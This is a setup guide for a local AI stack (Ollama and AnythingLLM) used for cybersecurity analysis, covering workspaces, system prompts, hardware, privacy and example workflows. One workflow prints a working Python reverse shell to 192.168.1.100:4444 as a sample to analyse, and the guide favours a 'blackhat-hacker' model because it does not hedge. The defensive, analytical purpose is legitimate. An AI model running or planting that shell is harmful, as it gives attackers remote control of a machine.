1. On the main sidebar, click **+ New Workspace**
2. Give it a descriptive name that reflects its purpose (e.g., `Threat Intelligence`, `Code Review`, `Red Team Analysis`)
3. Click **Create**

Repeat for each analytical role you need covered. The workspaces used in this deployment:

| Workspace Name | Model Assigned | Purpose |
|---|---|---|
| Threat Intelligence | `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` | CISA alerts, CVE triage, threat pattern analysis |
| Code Review | `deepseek-coder:33b-instruct` | Vulnerability assessment, code auditing |
| Red Team | `jimscard/blackhat-hacker:v2` | Adversarial perspective, attack surface analysis |
| Attack Chain | `deepseek-r1:32b` | Multi-step reasoning, campaign reconstruction |
| Deep Analysis | `llama3.1:70b-instruct-q4_K_M` | Long documents, complex reasoning tasks |
| General | `qwen3:32b` | Documentation, drafting, general analysis |

> 📸 **Screenshot needed:** AnythingLLM main sidebar showing all workspaces listed (Threat Intelligence, Code Review, Red Team, Attack Chain, Deep Analysis, General)

---

### Step 5: Assign a Model to Each Workspace

Each workspace can override the system default and use a specific model.

1. Open the workspace
2. Click the **Settings icon** (pencil or gear icon next to the workspace name)
3. Navigate to the **Chat Settings** or **LLM Configuration** tab
4. Under **Model**, select the specific model for this workspace from the dropdown
5. Click **Save** or **Update workspace**

The workspace will now always use that model for every chat session within it, regardless of the system default.

> 📸 **Screenshot needed:** AnythingLLM workspace settings panel showing the Chat Settings or LLM Configuration tab with a specific model selected in the model dropdown (e.g., Threat Intelligence workspace showing `ALIENTELLIGENCE/cybersecuritythreatanalysisv2`)

---

### Step 6: Configure System Prompts

The system prompt is the persistent instruction set that shapes how the model behaves in every conversation within a workspace. It is sent automatically at the start of every chat — the user never has to re-explain context, role, or behavioral expectations.

**To set a system prompt for a workspace:**

1. Open the workspace
2. Click the **Settings icon** next to the workspace name
3. Navigate to the **Prompt** tab
4. In the **System Prompt** field, enter your instructions
5. Click **Save** / **Update workspace**

**Example system prompt — Threat Intelligence workspace:**

```
You are a senior cybersecurity threat intelligence analyst. Your role is to analyze 
threat data, identify attack patterns, correlate indicators of compromise, and produce 
structured assessments for SOC operations. When reviewing alerts or CVE data, always 
address: threat actor TTPs, affected asset classes, exploitation likelihood, and 
recommended mitigations. Format analytical outputs with clear section headers. 
Prioritize operational relevance over theoretical discussion.
```

> 📸 **Screenshot needed:** AnythingLLM workspace settings → Prompt tab showing the system prompt field populated with the Threat Intelligence prompt above

**Example system prompt — Red Team workspace:**

```
You are an experienced penetration tester and red team operator. Analyze targets, 
systems, and configurations from an adversarial perspective. Identify attack vectors, 
exploitation paths, and defensive gaps. Present findings as an attacker would — 
enumerate what is visible, what is exploitable, and what the likely impact is. 
Assume a professional engagement context with explicit authorization.
```

**Example system prompt — Code Review workspace:**

```
You are a secure code reviewer specializing in vulnerability assessment. When analyzing 
code, identify: injection vulnerabilities, authentication flaws, insecure data handling, 
improper error handling, and dependency risks. Reference CVE identifiers and CWE 
classifications where applicable. Provide remediation recommendations with corrected 
code examples.
```

---

### How System Prompts Carry Across All Chats

This is one of the most operationally significant features of AnythingLLM's workspace model and is worth understanding clearly.

**The system prompt is not a message you send — it is the persistent context of the workspace itself.** Every time you open a new chat within a workspace, AnythingLLM automatically prepends the system prompt to the conversation before your first message. The model receives it as its foundational instruction set for that session.

This means:

- You never have to re-explain role, context, or behavioral expectations at the start of a session
- Every chat in the Threat Intelligence workspace behaves like a threat analyst from message one
- Every chat in the Code Review workspace applies secure coding analysis from message one
- Switching between workspaces is effectively switching between pre-configured analyst roles
- New chats within the same workspace inherit the same prompt — consistency is automatic

**Practical impact:** An analyst opening the Threat Intelligence workspace and pasting in a CISA alert gets an immediate structured analysis — threat actor TTPs, affected asset classes, recommended mitigations — without any setup conversation. The workspace did that work ahead of time.

**System prompt persistence across workspace updates:** If you edit a workspace's system prompt, the updated prompt applies to all new chats going forward. Existing chat histories retain the prompt that was active when those conversations occurred.

---

## Ollama Maintenance: Updating Models and Verifying the Library

Keeping models current matters for security work — model developers regularly push updated versions that improve reasoning accuracy, reduce hallucination rates, and sometimes patch behavioral issues. This section covers the full maintenance workflow.

---

### View All Installed Models

Open a terminal (Command Prompt or PowerShell) and run:

```
ollama list
```

**Example output from this system:**

```
NAME                                                    ID              SIZE      MODIFIED
llama3.1:70b-instruct-q4_K_M                            711a9e8463af    42 GB     3 weeks ago
ALIENTELLIGENCE/cybersecuritythreatanalysisv2:latest    b549743c0af8    4.7 GB    7 weeks ago
deepseek-coder:33b-instruct                             acec7c0b0fd9    18 GB     7 weeks ago
jimscard/blackhat-hacker:v2                             7ca851d0e11c    9.2 GB    7 weeks ago
phi4-reasoning:14b                                      47e2630ccbcd    11 GB     7 weeks ago
qwen3:32b                                               030ee887880f    20 GB     7 weeks ago
deepseek-r1:32b                                         edba8017331d    19 GB     7 weeks ago
```

The output shows: model name and tag, model ID hash, size on disk, and when it was last modified (pulled or updated).

> 📸 **Screenshot needed:** Terminal window showing the full output of `ollama list` displaying all 8 deployed models with sizes and modified dates

---

### Check Ollama Service Status

Verify the Ollama background service is running:

```
ollama serve
```

If Ollama is already running as a service, this will return a message indicating the address is already in use — which confirms it is active. You can also check Task Manager → Services and look for the Ollama process.

> 📸 **Screenshot needed:** Terminal showing Ollama serve response confirming the service is running, OR Task Manager → Services tab with the Ollama service visible and status showing Running

---

### Pull a New Model

To download a model you don't have yet:

```
ollama pull modelname:tag
```

Examples:

```
ollama pull qwen3:32b
ollama pull deepseek-r1:32b
ollama pull ALIENTELLIGENCE/cybersecuritythreatanalysisv2
```

Ollama will show a download progress bar. Large models (18–42GB) will take significant time depending on your connection speed. Downloads resume automatically if interrupted.

> 📸 **Screenshot needed:** Terminal window showing an active `ollama pull` download with the progress bar, percentage, and download speed visible

---

### Update an Existing Model to the Latest Version

Re-pulling a model you already have checks for and downloads any updated version:

```
ollama pull modelname:tag
```

If the model is already at the latest version, Ollama will confirm this and skip the download. If an update exists, it downloads the new version and replaces the old one.

**To update all models in one pass**, run a pull on each model in your library sequentially. There is no single `ollama update --all` command — each model must be pulled individually.

> 📸 **Screenshot needed:** Terminal showing `ollama pull` on an already-current model confirming "up to date" with no download, OR showing a version update downloading

---

### Remove a Model

To delete a model and free up disk space:

```
ollama rm modelname:tag
```

Example:

```
ollama rm phi4-reasoning:14b
```

Confirm removal with `ollama list` afterward.

> 📸 **Screenshot needed:** Terminal showing `ollama rm` command completing successfully, followed by `ollama list` output confirming the model is no longer present

---

### Run a Quick Model Test

To verify a model is working correctly after pulling or updating:

```
ollama run modelname:tag "Your test prompt here"
```

Example:

```
ollama run qwen3:32b "List three common lateral movement techniques used in APT campaigns."
```

This runs an inference pass directly in the terminal. Watch Task Manager → GPU Performance during the run to confirm VRAM is being utilized. A working model will show VRAM utilization spike within a few seconds of the command executing.

> 📸 **Screenshot needed:** Split view or two screenshots — (1) terminal showing `ollama run qwen3:32b` with a response generating, and (2) Task Manager GPU tab showing VRAM utilization spike during that same run

---

## The Importance of VRAM and System RAM

Hardware resources are the single largest constraint in local AI deployment. Understanding why VRAM and RAM matter — and what happens when you don't have enough of either — is essential for anyone planning or evaluating a similar infrastructure.

---

### VRAM: Why 16GB Is the Practical Minimum for This Use Case

VRAM (Video RAM on the GPU) is where the model weights live during inference. When you run a query, the model doesn't read from disk — it reads from VRAM. If the model doesn't fit in VRAM, it either fails to load or offloads layers to system RAM, which dramatically reduces inference speed.

**Model size vs. VRAM requirements at common quantization levels:**

| Model Size | FP16 (full precision) | Q8 | Q4_K_M (4-bit) |
|---|---|---|---|
| 7B parameters | ~14GB | ~7GB | ~4GB |
| 13B parameters | ~26GB | ~13GB | ~7GB |
| 32–33B parameters | ~64GB | ~32GB | ~18GB |
| 70B parameters | ~140GB | ~70GB | ~42GB |

The RTX 4080's 16GB VRAM fits:
- Any 7B or 13B model at full or high precision
- 32B–33B models at Q4 quantization (some VRAM margin left)
- 70B models only at aggressive Q4 quantization with partial system RAM offload

**What happens with less VRAM:**

- **8GB VRAM (e.g., RTX 3070):** Limited to 7B models at Q4. Anything larger requires heavy system RAM offload, dropping inference speed to 0.5–1 token/second — barely usable for analytical work.
- **12GB VRAM (e.g., RTX 3080 12GB):** Can run 13B models well and 33B models at aggressive quantization with significant quality degradation.
- **24GB VRAM (e.g., RTX 3090/4090):** Can run 33B models at Q8 (higher quality) and 70B models at Q4 without system RAM offload.

**The 16GB sweet spot:** The RTX 4080's 16GB fits the 32B–33B models that represent the best capability/cost tradeoff for security analysis work. These models are analytically capable enough for real threat intelligence work while running at 3–5 tokens/second — operationally usable speeds.

---

### System RAM: Why 64GB Matters

System RAM plays a different but equally critical role in local AI deployment.

**Primary functions of system RAM in this context:**

1. **Model layer offloading** — When a model is too large to fit entirely in VRAM, Ollama offloads some layers to system RAM. The 70B model at Q4 (42GB) exceeds the 4080's 16GB VRAM — the overflow runs in system RAM. More RAM means more layers can be offloaded without crashing, and the model degrades gracefully rather than failing.

2. **Operating system and concurrent processes** — Windows 11 Pro with background services, AnythingLLM, a browser, and other tools can easily consume 16–20GB of RAM before inference begins. 64GB ensures the OS and support stack never compete with the model for memory.

3. **Multiple simultaneous operations** — Running a large model while also processing documents in AnythingLLM, running security tools, or operating other applications requires RAM headroom that 16GB or 32GB systems don't have.

4. **Future model growth** — Model sizes are increasing. 64GB provides runway for larger models that don't exist yet or weren't practical when this system was built.

**What happens with insufficient system RAM:**

- **16GB total system RAM:** With 8–12GB consumed by the OS and applications, only 4–8GB remains for model offload. Large models will fail to load or crash mid-inference on sustained workloads.
- **32GB total system RAM:** Workable for most 32B models but creates memory pressure during multi-tasking. The 70B model becomes unreliable.
- **64GB total system RAM:** Comfortable headroom for the full model library, OS overhead, and concurrent applications without memory pressure.

---

### The Combined Effect: VRAM + RAM Working Together

The highest performance scenario is when the entire model fits in VRAM — system RAM is not involved in inference at all, and the GPU handles every computation directly. This is the fast path: 3–5 tokens/second.

When a model exceeds VRAM and offloads to system RAM, inference speed drops because data must transfer across the PCIe bus between the GPU and system memory on every layer computation that uses offloaded weights. The more layers offloaded, the slower the inference.

**Rule of thumb for this deployment:**

- Models ≤16GB → fit entirely in VRAM → full speed (3–5 tokens/second)
- Models 16–42GB → partial offload to system RAM → moderate speed reduction
- Models >42GB → significant offload → slower, but 64GB system RAM prevents failure

This is why the hardware configuration in this project was not arbitrary — 16GB VRAM and 64GB system RAM were selected together as a matched pair to support the specific model library being deployed.

---

## Security and Privacy Considerations

Local AI deployment is often framed as a performance or cost decision. For cybersecurity work, it is primarily a security decision. This section explains why data sovereignty matters beyond inference speed and what the real risks of cloud AI usage are in sensitive operational contexts.

---

### What Happens to Data Sent to Cloud AI Services

Every query sent to a cloud AI service — ChatGPT, Gemini, Claude, Copilot — travels across the internet to a private company's servers, is processed on hardware you do not control, and is subject to that company's data retention, usage, and disclosure policies.

For general consumer use this is an acceptable tradeoff. For cybersecurity work involving sensitive data, it is not.

**Specific risks:**

- **Data retention** — Most commercial AI providers retain query data for periods ranging from 30 days to indefinitely depending on account type and settings. Data submitted in a query may be used to improve future model versions.
- **Government data requests** — All major cloud AI providers are subject to legal process in their jurisdiction. A subpoena, National Security Letter, or equivalent legal instrument can compel disclosure of query data. The company may be prohibited from informing you this occurred.
- **Insider threat** — Data processed on third-party infrastructure is accessible to that company's employees and contractors subject to their internal access controls — controls you cannot audit or verify.
- **Third-party processing** — Some cloud AI services route queries through additional vendors for content filtering, safety review, or infrastructure purposes. Data may traverse more systems than the primary service implies.
- **Terms of service changes** — Policies that are acceptable today may change. Data already submitted under prior terms may be subject to new policies retroactively.

None of these risks are hypothetical. They are documented features of how cloud AI services operate.

---

### What Local Deployment Changes

When inference runs entirely on local hardware:

- **No data leaves the machine** — Queries, documents, and outputs never traverse a network unless you explicitly export them
- **No third-party retention** — There is no external party with access to your query history
- **No legal exposure** — A government data request served on Ollama or AnythingLLM yields nothing because no query data is stored on their servers — you are running their software locally
- **No policy risk** — Terms of service for the model runtime do not affect data you process locally
- **Auditable** — Every component of the stack (Ollama, AnythingLLM, the model weights) is open source and inspectable

---

### Practical Application to Federal Cybersecurity Work

Federal cybersecurity roles operate under explicit data handling requirements. Threat intelligence, network traffic captures, vulnerability scan results, incident response artifacts, and asset inventory data all carry handling requirements that commercial cloud AI cannot meet.

The local AI infrastructure documented here is designed from the ground up around these requirements:

- **Air-gap capable** — The system operates with zero external network dependencies. It can run on a machine with no internet connection at all once models are downloaded
- **No telemetry** — Ollama does not phone home with usage data during inference
- **Classified-adjacent workflows** — While this system is not certified for classified processing, the architectural pattern — local inference, no external transmission, operator-controlled hardware — is the same pattern used in classified AI deployments

This infrastructure demonstrates not just technical capability but the security reasoning that federal employers look for in GS-11/12 candidates. The decision to run local is itself a security decision, and documenting the rationale behind it shows understanding of why data sovereignty matters in operational environments.

---

## Real-World Workflow Examples

This section shows the infrastructure working on actual tasks — the kind of analytical work it was built for. Each example follows the same pattern: task description, model selected and why, the prompt used, and a placeholder for the actual output screenshot.

---

### Workflow 1: CISA Alert Triage

**Scenario:** A new CISA Known Exploited Vulnerability alert drops. The task is to rapidly assess whether it affects any systems in a sample environment and what the priority response should be.

**Model used:** `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` via the Threat Intelligence workspace

**Why this model:** The cybersecurity specialist model is trained on threat intelligence frameworks and produces structured assessments aligned with how SOC analysts actually document threats — TTPs, affected asset classes, exploitation likelihood, recommended mitigations. A general model would produce a less operationally structured response to the same prompt.

**Prompt used:**

```
Analyze the following CISA KEV alert and produce a structured threat assessment.
Address: (1) what vulnerability is being exploited, (2) affected systems and asset classes,
(3) known threat actor TTPs associated with this CVE, (4) exploitation likelihood in
a Windows-dominant enterprise environment, (5) immediate mitigations and recommended
timeline. Format with clear section headers.

[CISA alert text pasted here]
```

**Expected output structure:**
- Vulnerability summary with CVE identifier and CVSS score context
- Affected asset class mapping
- Threat actor TTP analysis referencing MITRE ATT&CK
- Exploitation likelihood assessment with rationale
- Prioritized mitigation recommendations with timeline

> 📸 **Screenshot needed:** AnythingLLM Threat Intelligence workspace showing the CISA alert prompt submitted and the structured analysis response generated by the cybersecurity model

---

### Workflow 2: Malware Code Review

**Scenario:** A suspicious Python script was found on a system during an incident response. The task is to analyze what it does, identify malicious functionality, and classify the threat.

**Model used:** `deepseek-coder:33b-instruct` via the Code Review workspace

**Why this model:** Code-specialized models understand program logic, data flow, and common malicious patterns at a deeper level than general models. DeepSeek Coder:33b produces line-level analysis explaining what each section of code does and why specific patterns are malicious.

**Prompt used:**

```
Analyze the following Python script for malicious functionality. Identify:
(1) what the script does at a high level, (2) specific malicious functions or patterns
with line references, (3) indicators of compromise this script would leave,
(4) likely threat actor capability level based on code quality,
(5) relevant MITRE ATT&CK technique IDs for the behaviors observed.

[Suspicious script pasted here]
```

> 📸 **Screenshot needed:** AnythingLLM Code Review workspace showing a suspicious script submitted and the model's line-by-line malicious functionality analysis

---

### Workflow 3: Attack Chain Reconstruction

**Scenario:** Multiple alerts fired across a 72-hour window. The task is to determine whether they represent an unrelated series of events or a coordinated attack campaign, and if coordinated, reconstruct the likely attack chain.

**Model used:** `deepseek-r1:32b` via the Attack Chain workspace

**Why this model:** The R1 reasoning model works through problems step by step with visible chain-of-thought output. For attack chain reconstruction — which requires correlating disparate events and drawing logical inferences — the ability to see the model's reasoning process is as valuable as the conclusion. If the reasoning chain contains an error, it can be identified and corrected.

**Prompt used:**

```
The following security alerts fired across a 72-hour window on the same network segment.
Analyze them for correlation. Work through this step by step:
(1) identify any common indicators across alerts, (2) assess whether the events could
represent a single coordinated campaign, (3) if yes, reconstruct the probable attack
chain in chronological order with confidence levels, (4) identify what phase of the
MITRE ATT&CK lifecycle each event maps to, (5) identify what evidence would confirm
or refute your reconstruction.

[Alert log data pasted here]
```

> 📸 **Screenshot needed:** AnythingLLM Attack Chain workspace showing alert data submitted and the R1 model's step-by-step reasoning chain and attack reconstruction output

---

### Workflow 4: Red Team Perspective Review

**Scenario:** A network architecture diagram needs to be reviewed from an adversarial perspective before a security assessment. The task is to identify the most likely attack paths an attacker would pursue.

**Model used:** `jimscard/blackhat-hacker:v2` via the Red Team workspace

**Why this model:** General models asked to "think like an attacker" tend to hedge and default back to defensive recommendations. This model maintains the adversarial perspective consistently and enumerates attack paths in the priority order an actual attacker would use them.

**Prompt used:**

```
You are a red team operator conducting a pre-engagement review of the following
network architecture. Identify: (1) the three highest-value targets for an attacker
with initial foothold on the user VLAN, (2) the most likely lateral movement paths
to reach each target, (3) what defensive controls would be bypassed by each path,
(4) what evidence each approach would leave for defenders to detect.
Prioritize paths by likelihood of success, not by impact.

[Network architecture description pasted here]
```

> 📸 **Screenshot needed:** AnythingLLM Red Team workspace showing the architecture description submitted and the adversarial analysis output with prioritized attack paths

---

## Lessons Learned

Three deployment architectures were tested before arriving at the current production setup. This section documents what actually went wrong during those tests — not the sanitized version, but the specific failures and what they taught.

---

### Docker Desktop + ngrok: What Failed

**The plan:** Run Ollama inside a Docker container for portability and isolation. Use ngrok to expose the API endpoint for remote access from other devices.

**What actually happened:**

The Docker approach worked — technically. Models loaded, inference ran, the API responded. The problems were all performance and operational:

- **VRAM utilization dropped immediately.** Docker Desktop on Windows uses a Hyper-V or WSL2 backend to run Linux containers. GPU passthrough through this layer is lossy. The RTX 4080's 16GB was not being fully utilized — effective VRAM available to the model was lower than the hardware spec, which meant models that should have fit in VRAM were partially offloading to system RAM.

- **Token generation was measurably slower.** The abstraction layer adds latency on every computation cycle. On a 32B model, this wasn't catastrophic — maybe 20-30% slower — but it was consistent and unnecessary.

- **The ngrok dependency broke the air-gap.** The entire point of local AI is that nothing leaves the machine. ngrok creates an outbound tunnel to ngrok's servers so external devices can reach the local API. That tunnel is an external dependency. Any query routed through that tunnel is, by definition, no longer air-gapped. The setup defeated its own purpose.

- **Container lifecycle management was friction.** Starting the system required starting Docker Desktop, waiting for the daemon, starting the container, confirming the API was available, then opening AnythingLLM. Native install starts automatically at boot. The operational overhead was real.

**What it taught:** Containerization solves portability and isolation problems. This deployment has neither problem — it runs on one machine and doesn't need isolation from itself. Adding Docker added overhead, latency, and an external dependency in exchange for solving no actual problem.

---

### WSL (Windows Subsystem for Linux): What Failed

**The plan:** Run Ollama in a WSL2 Linux environment to get native Linux performance characteristics on Windows hardware.

**What actually happened:**

WSL2 is genuinely impressive software. But it is still a virtualization layer, and virtualization layers have costs:

- **GPU driver integration was unstable.** NVIDIA's WSL2 GPU support works — but the handoff between the Windows NVIDIA driver and the WSL2 CUDA environment introduced occasional instability on long inference runs. Models would complete most of a response and then hang. This was intermittent, which made it worse — unpredictable failures are harder to work around than consistent ones.

- **Effective hardware utilization was lower.** RAM allocation to the WSL2 VM competed with Windows processes. The default WSL2 memory configuration didn't allocate the full 64GB — it reserved a portion for the Windows host. Running large models in WSL2 with suboptimal memory allocation caused unnecessary offloading.

- **The abstraction layer added latency.** Not as much as Docker, but measurable. Every operation that crossed the WSL2 boundary — file access, network calls, GPU dispatch — added overhead compared to native execution.

- **Maintenance was more complex than expected.** WSL2 is essentially a separate Linux environment that needs to be maintained independently — updates, configuration, package management — while also maintaining the Windows environment. For a single-user deployment, this doubled the maintenance surface without adding capability.

**What it taught:** WSL2 is excellent for development workflows where you need Linux tooling on a Windows machine. It is not the right architecture for a performance-sensitive inference workload where the goal is maximum hardware utilization. Native Windows gives Ollama direct hardware access through the NVIDIA Windows driver stack — the path of least resistance to the GPU.

---

### What Would Be Done Differently

If rebuilding this from scratch with current knowledge:

1. **Start with native Windows immediately.** The Docker and WSL testing was valuable for documentation purposes but consumed roughly two weeks of iteration that could have been avoided.

2. **Pull a small test model first.** The first large model pull (42GB Llama) was done before confirming the full stack worked. Starting with a 4-5GB model to validate the entire pipeline — Ollama → AnythingLLM → workspace → response — before committing to large downloads would have saved time.

3. **Build the workspace structure before the model library.** The model library grew organically before AnythingLLM workspaces were configured. Having the workspace and system prompt structure defined first would have made model selection more deliberate — choosing models to fill defined roles rather than accumulating models and then figuring out what to do with them.

4. **Document as you go.** The 101+ pages of deployment documentation that existed by the time this project was formalized were written after the fact from memory and notes. Writing documentation during each phase would have produced more accurate technical detail.

---

## Troubleshooting

Common problems encountered during deployment and ongoing operation, with solutions.

---

### Ollama

**Problem:** `ollama` command not found after installation

**Cause:** The installer adds Ollama to PATH but the current terminal session predates the installation.

**Fix:** Close and reopen the terminal. If the problem persists, manually add the Ollama installation directory to your system PATH via System Properties → Environment Variables.

---

**Problem:** `ollama list` shows no models after pulling

**Cause:** The pull completed but Ollama stored models in a different location than expected, or the pull was interrupted.

**Fix:** Run `ollama pull modelname:tag` again. If the model partially downloaded, Ollama will resume from where it stopped. Confirm models are stored in `C:\Users\[username]\.ollama\models` — if they are on a different drive, set the `OLLAMA_MODELS` environment variable to point to the correct path.

---

**Problem:** Model loads but GPU shows 0% utilization in Task Manager

**Cause:** Ollama is running the model on CPU instead of GPU. This happens when CUDA drivers are outdated, not installed, or when Ollama cannot detect the GPU.

**Fix:**
1. Update NVIDIA drivers to the latest version from nvidia.com
2. Restart the Ollama service (restart the computer or kill and restart the Ollama process from Task Manager)
3. Run `ollama run modelname "test"` and immediately check Task Manager → Performance → GPU for VRAM utilization

---

**Problem:** Inference starts then hangs mid-response

**Cause:** Usually a memory pressure issue — the model is trying to use more VRAM or RAM than is available, causing the inference process to stall waiting for memory.

**Fix:**
1. Close other applications consuming RAM (browsers with many tabs, other running programs)
2. If running a 70B model, ensure at least 20GB of system RAM is free before starting inference
3. Switch to a smaller model if the system consistently struggles with this model size

---

**Problem:** `ollama pull` fails or stalls mid-download

**Cause:** Network interruption or temporary connectivity issue.

**Fix:** Re-run the same `ollama pull` command. Ollama resumes interrupted downloads automatically — it will not restart from the beginning.

---

**Problem:** `ollama serve` returns "address already in use"

**Cause:** This is not an error — it means Ollama is already running as a background service. This is the expected state.

**Fix:** Nothing. This message confirms Ollama is active and ready to accept connections.

---

### AnythingLLM

**Problem:** AnythingLLM shows no models in the model dropdown after connecting Ollama

**Cause:** AnythingLLM cannot reach the Ollama API, or Ollama is not running.

**Fix:**
1. Open a terminal and run `ollama list` — if this works, Ollama is running
2. Confirm the Base URL in AnythingLLM settings is exactly `http://localhost:11434` with no trailing slash
3. Restart AnythingLLM and check the model dropdown again
4. If still empty, restart the computer and reopen AnythingLLM

---

**Problem:** Workspace responses are slow or time out

**Cause:** The model assigned to the workspace is larger than VRAM can efficiently handle, causing heavy system RAM offloading and slow inference.

**Fix:**
1. Switch the workspace to a smaller model (e.g., `phi4-reasoning:14b` instead of `llama3.1:70b`)
2. Close other applications to free system RAM before running large model inference
3. Increase AnythingLLM's response timeout in Settings if the model is simply taking longer than the default timeout allows

---

**Problem:** System prompt doesn't seem to be affecting model behavior

**Cause:** Either the system prompt wasn't saved, or the current chat session predates the prompt being set.

**Fix:**
1. Go to workspace settings → Prompt tab → confirm the system prompt text is present
2. Click Save / Update workspace
3. Start a **new chat** within the workspace — existing chat sessions may not pick up prompt changes mid-conversation

---

**Problem:** AnythingLLM loses workspace settings after an update

**Cause:** Some AnythingLLM updates reset workspace configurations.

**Fix:** After any AnythingLLM update, verify each workspace's assigned model and system prompt before use. Keep a local text file with all system prompts backed up so they can be quickly re-entered if lost.

---

## Glossary

Key terms used throughout this document, defined for readers who may be new to local AI infrastructure.

---

**Air-gap**
A security configuration in which a system has no connection to external networks. In the context of this project, air-gap capability means the AI infrastructure can operate with zero internet connectivity once models are downloaded — no queries, outputs, or data leave the machine under any circumstances.

---

**AnythingLLM**
An open-source desktop application that provides a workspace-based chat interface for AI models. Sits on top of Ollama and adds features including document ingestion, conversation history, system prompt management, and per-workspace model assignment. Does not process AI inference itself — it sends queries to Ollama and displays the responses.

---

**Inference**
The process of running a trained AI model to generate output. When you send a message to an AI model and it generates a response, that generation process is called inference. All inference in this project runs locally on the RTX 4080 GPU.

---

**Model weights**
The numerical parameters that define how an AI model processes and responds to input. A model's weights are what get downloaded when you run `ollama pull` — they are the trained "knowledge" of the model stored as large files on disk. Larger parameter counts (7B, 32B, 70B) mean more weights, more disk space, more VRAM required, and generally more capability.

---

**Ollama**
An open-source runtime that manages local AI model downloads, storage, and inference. Provides a simple command-line interface and a local REST API that applications like AnythingLLM use to query models. Handles hardware optimization automatically — detecting available GPU and configuring inference accordingly.

---

**Parameters (B)**
The numerical components that make up an AI model. Parameter count is expressed in billions (B) — a 7B model has 7 billion parameters, a 70B model has 70 billion. More parameters generally means more capability but also more hardware requirements. Parameter count is the primary driver of model size and VRAM requirements.

---

**Quantization**
A compression technique that reduces the numerical precision of model weights to decrease file size and VRAM requirements, at some cost to output quality. Common quantization levels include Q4 (4-bit), Q5, and Q8 (8-bit). Q4_K_M is the quantization format used for the 70B model in this project — it reduces the model from ~140GB at full precision to 42GB while preserving most reasoning capability. Think of it as a lossy compression format for AI models.

---

**RAG (Retrieval-Augmented Generation)**
A technique where an AI model's responses are informed by specific documents you provide, rather than relying solely on its training data. In AnythingLLM, uploading a document to a workspace enables RAG — the model can reference that specific document when answering questions. Used in this project for analyzing uploaded threat reports and CVE data against specific organizational context.

---

**System prompt**
A persistent set of instructions given to an AI model before any user conversation begins. The system prompt defines the model's role, behavior, and response format for every conversation in a workspace. In AnythingLLM, the system prompt is configured per workspace and automatically applied to every new chat — the user never has to re-explain context at the start of a session.

---

**Tokens / Tokens per second**
AI models process text as tokens — chunks of characters that are roughly 3-4 characters each on average. "Tokens per second" measures how fast a model generates output. At 3-5 tokens/second (the measured rate for `qwen3:32b` on this hardware), a 500-word response takes approximately 2-4 minutes to generate. Larger models run slower; smaller models run faster.

---

**VRAM (Video RAM)**
Memory located directly on the GPU chip, used to store model weights during inference. VRAM is the primary hardware constraint for local AI deployment — a model must fit within VRAM (or a combination of VRAM and system RAM) to run. The RTX 4080 has 16GB of VRAM, which determines the maximum model size that can run at full speed without system RAM offloading.

---

**WSL (Windows Subsystem for Linux)**
A Microsoft feature that allows running a Linux environment inside Windows. Tested as a potential deployment path for Ollama during the architecture evaluation phase and rejected due to performance overhead and GPU driver instability compared to native Windows installation.

---

## Real-World Workflow Examples

These examples show how the infrastructure is used end-to-end on actual analytical tasks. Each follows the same pattern: open the appropriate workspace, submit the input, review the output. No cloud transmission occurs at any point.

---

### Workflow 1: CISA Alert Triage

**Workspace:** Threat Intelligence (`ALIENTELLIGENCE/cybersecuritythreatanalysisv2`)

**Scenario:** A new CISA advisory drops. The analyst needs to quickly determine whether it is relevant to the environment, what the threat actor's likely TTPs are, and what immediate mitigations apply.

**Step 1:** Open the Threat Intelligence workspace in AnythingLLM.

**Step 2:** Paste the CISA advisory text directly into the chat window. Example input:

```
CISA Alert AA25-XXX: Threat actors affiliated with [group] have been observed 
exploiting CVE-XXXX-XXXX in [affected software] versions prior to X.X. 
Exploitation enables unauthenticated remote code execution. CISA has observed 
active exploitation in the wild targeting critical infrastructure sectors.
```

**Step 3:** The model — already configured with the Threat Intelligence system prompt — immediately structures its response around:
- Threat actor TTP classification (MITRE ATT&CK mapping)
- Affected asset classes in the environment
- Exploitation likelihood assessment
- Prioritized mitigation steps

> 📸 **Screenshot needed:** AnythingLLM Threat Intelligence workspace showing a CISA alert pasted as input and the model's structured analytical response

**What this demonstrates:** The system prompt eliminates the need to re-explain analytical framework at the start of every session. The model behaves as a trained threat analyst from the first token of every response.

---

### Workflow 2: Malware Code Review

**Workspace:** Code Review (`deepseek-coder:33b-instruct`)

**Scenario:** A suspicious script has been recovered from an endpoint. The analyst needs to understand what it does, identify its capabilities, and assess what damage it could cause.

**Step 1:** Open the Code Review workspace.

**Step 2:** Paste the suspicious code. Example:

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

**Step 3:** The model identifies this as a reverse shell, explains the socket connection mechanism, identifies the hardcoded C2 IP and port, explains what `dup2` does in this context, and assesses the capability and likely intent.

> 📸 **Screenshot needed:** AnythingLLM Code Review workspace showing malicious code submitted and the model's vulnerability/capability breakdown response

**What this demonstrates:** Sensitive code — potentially from an active incident — never leaves the local machine. A cloud-based tool would transmit this code to external servers, creating chain-of-custody and classification concerns.

---

### Workflow 3: Attack Chain Reconstruction

**Workspace:** Attack Chain (`deepseek-r1:32b`)

**Scenario:** Multiple alerts have fired over a 48-hour window. The analyst needs to determine whether these are isolated events or steps in a coordinated campaign.

**Step 1:** Open the Attack Chain workspace.

**Step 2:** Submit a timeline of events:

```
T+00:00 - Phishing email opened by user, attachment executed
T+02:15 - Unusual PowerShell execution detected on workstation
T+04:30 - LSASS memory access observed
T+06:00 - Lateral movement to file server via SMB
T+18:00 - Scheduled task created on domain controller
T+24:00 - Outbound traffic to unknown IP on port 443
T+48:00 - Large data transfer to external destination
```

**Step 3:** The R1 model works through the chain step by step — showing its reasoning at each stage — and maps the sequence to a complete attack lifecycle: initial access → execution → credential access → lateral movement → persistence → exfiltration.

> 📸 **Screenshot needed:** AnythingLLM Attack Chain workspace showing the event timeline submitted and the model's step-by-step campaign reconstruction with MITRE ATT&CK stage mapping

**What this demonstrates:** The R1 model's chain-of-thought reasoning is visible in the output — the analyst can follow the logic and identify where the model's assessment differs from their own, rather than just receiving a black-box conclusion.

---

### Workflow 4: Red Team Surface Analysis

**Workspace:** Red Team (`jimscard/blackhat-hacker:v2`)

**Scenario:** Before a scheduled penetration test, the analyst wants an adversarial assessment of a network configuration to identify likely attack vectors.

**Step 1:** Open the Red Team workspace.

**Step 2:** Submit the configuration details (sanitized for this example):

```
Network segment: 192.168.10.0/24
Exposed services: RDP (3389), SMB (445), HTTP (80), SSH (22)
